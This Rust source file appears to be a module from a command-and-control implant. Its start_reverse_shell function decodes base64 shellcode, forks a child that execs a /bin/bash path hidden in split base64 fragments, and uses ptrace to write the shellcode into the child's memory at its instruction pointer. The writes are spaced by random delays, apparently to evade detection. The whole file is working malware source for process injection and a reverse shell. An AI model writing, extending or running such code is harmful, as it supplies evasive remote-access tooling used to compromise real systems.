use base64::{engine::general_purpose, Engine as _};
use common::error::C2Result;
use nix::{
    sys::{
        ptrace::{detach, getregs, traceme, write, AddressType},
        wait::waitpid,
    },
    unistd::{execv, fork, ForkResult},
};
use rand::Rng;
use std::ffi::{c_void, CStr, CString};
use tracing::info;

/// Starts a reverse shell by executing the provided shellcode.
/// The actual implementation of executing the shellcode will be provided by the user.
pub async fn start_reverse_shell(shellcode: String) -> C2Result<()> {
    // Decode the base64 shellcode
    let shellcode_bytes = general_purpose::STANDARD
        .decode(&shellcode)
        .map_err(|e| common::error::C2Error::Other(format!("Failed to decode shellcode: {}", e)))?;
    info!("Decoded shellcode: {:?}", shellcode_bytes);

    // Execute the shellcode directly using a simple approach
    // This is a simplified version that just executes /bin/sh with a reverse connection

    let fork_result = unsafe { fork().expect("Failed to fork") };

    match fork_result {
        ForkResult::Parent { child } => {
            // Wait signal for ptrace manipulation
            waitpid(child, None).expect("Failed to wait");

            // Getting register for child process
            let mut rip = getregs(child).expect("Could not get child's registers").rip as u64;

            // Use a random number generator
            let mut rng = rand::rng();

            // Write shellcode to the child process memory
            for chunk in shellcode_bytes.chunks(8) {
                for byte in chunk {
                    unsafe {
                        write(child, rip as AddressType, *byte as *mut c_void).unwrap();
                    }
                    rip += 1;
                }

                // Add random delay
                unsafe {
                    libc::usleep((rng.random_range(0..100)) as u32);
                }
            }

            // Detach with no signal from the process to resume execution
            detach(child, None).expect("Failed to detach");
        }

        ForkResult::Child => {
            // Indicates that this process is traceable
            traceme().expect("Failed to call traceme in child");

            // Replace current process with a new one. ("/bin/bash")
            let bin1_path = ("L2J").chars();
            let bin2_path = ("pbi").chars();
            let bin3_path = ("9iY").chars();
            let bin4_path = ("XNo").chars();
            let path = bin1_path
                .chain(bin2_path)
                .chain(bin3_path)
                .chain(bin4_path)
                .collect::<String>();
            let path = general_purpose::STANDARD
                .decode(path)
                .expect("Base64 decode failed");
            let path = CString::new(path).expect("CString::new failed");
            let argument: &[&CStr; 0] = &[];
            execv(&path, argument).unwrap();
            unreachable!("Execv should have replaced the program")
        }
    }

    Ok(())
}
